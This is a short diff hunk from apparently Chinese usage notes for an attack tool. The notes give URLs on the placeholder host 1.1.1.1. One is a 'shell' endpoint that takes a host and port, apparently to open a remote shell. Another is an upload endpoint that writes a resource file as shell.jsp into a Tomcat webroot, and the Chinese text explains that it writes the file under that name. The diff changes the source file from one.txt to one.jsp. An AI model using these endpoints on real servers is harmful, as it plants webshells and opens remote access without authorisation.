@@ -17,7 +17,7 @@ http://1.1.1.1/services/config/shell?host=1.1.1.1&port=5555
 
 3、文件上传
 http://1.1.1.1/services/config/upload?path=/opt/tomcat/webapps/ROOT/shell.jsp 
-(会把resource目录下面的one.txt 写成shell.jsp，注意：全路经，带*文件名)
+(会把resource目录下面的one.jsp 写成shell.jsp，注意：全路经，带*文件名)
 
 
 4、文件下载
